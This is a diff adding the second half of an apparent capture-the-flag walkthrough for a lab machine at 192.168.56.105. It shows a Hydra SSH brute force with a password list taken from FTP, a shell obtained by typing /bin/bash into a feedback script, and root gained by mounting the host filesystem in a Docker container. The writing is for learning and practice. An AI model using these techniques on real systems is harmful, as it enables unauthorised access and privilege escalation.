@@ -82,3 +82,103 @@ p_lists.txt
 ```
 These files looked interesting and potentially contained useful information such as credentials or hints.
 
+## Downloading Files
+I downloaded both files to my local machine:
+```bash
+get information.txt
+get p_lists.txt
+```
+The transfer completed successfully.
+## Exiting FTP
+```bash
+exit
+```
+Read the contents of the files:
+```bash
+cat information.txt
+cat p_lists.txt
+```
+## SSH Brute Force (Hydra
+After obtaining a potential password list (p_lists.txt) from the FTP server, I used Hydra to perform a brute force attack on the SSH service.
+```bash
+hydra -l robin -P p_lists.txt 192.168.56.105 ssh
+```
+## Result
+Hydra successfully discovered valid SSH credentials:
+```bash
+[22][ssh] host: 192.168.56.105   login: robin   password: k4vr3ndh4nh4ck3r
+```
+This confirms that:
+- Username: robin
+- Password: k4vr3ndh4nh4ck3r
+
+## Gaining Initial Access
+Using the discovered credentials, I logged into the target machine via SSH:
+```bash
+ssh robin@192.168.56.105
+```
+## Executing feedback.sh
+During the enumeration phase, a script named feedback.sh was discovered. This script appears to collect user input and execute a shell.
+
+## Running the Script
+To execute the script:
+```bash
+./feedback.sh
+```
+## Interaction
+The script prompts for user input:
+
+Enter Your Name: Enter You FeedBack About This Target Machine:
+
+Example:
+
+Enter Your Name: Harris Hakimie Enter You FeedBack About This Target Machine: /bin/bash
+
+The script executes a shell, giving access to the system.
+```bash
+whoami
+```
+It shown that the user is:
+
+jerry
+
+## User Information
+```bash
+id
+```
+uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
+
+## Checking Available Docker Images
+```bash
+docker images
+```
+```bash
+REPOSITORY   TAG     IMAGE ID       CREATED        SIZE
+alpine       latest  28f6e2705743   5 years ago    5.61MB
+```
+## Exploiting Docker for Root Access
+I used Docker to mount the host filesystem and spawn a root shell:
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
+```
+## Root Access Achieved
+```bash
+whoami
+```
+```bash
+root
+```
+## Capturing Root Flag
+Navigate to root directory:
+```bash
+cd /root
+ls
+```
+```bash
+root.txt
+```
+Read the flag:
+```bash
+cat root.txt
+```
+Congratulations You Reached Root...! Root-Flag FLAG{r00t-H4ckTh3Pl4n3t0nc34g41n}
